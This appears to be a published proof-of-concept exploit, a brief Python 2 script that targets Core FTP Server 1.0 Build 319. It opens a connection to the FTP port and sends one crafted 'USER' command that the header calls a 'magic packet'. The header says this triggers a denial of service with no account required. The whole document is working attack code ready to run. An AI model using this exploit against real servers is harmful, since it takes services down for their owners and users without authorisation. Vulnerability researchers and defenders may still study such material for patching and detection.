# Core FTP Server 1.0 Build 319
# Denial of Service Vulnerability
# Note: FTP account is not required for exploitation
# http://www.mertsarica.com

import socket, sys

HOST = 'localhost'    
PORT = 21             
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try: 
    s.connect((HOST, PORT))
except:
    print "Connection error"
    sys.exit(1)

try:
    s.send('USER MS\r\n') # magic packet
    s.close()
    print("Very good, young padawan, but you still have much to learn...")
except:
    print "Connection error"
    sys.exit(1)
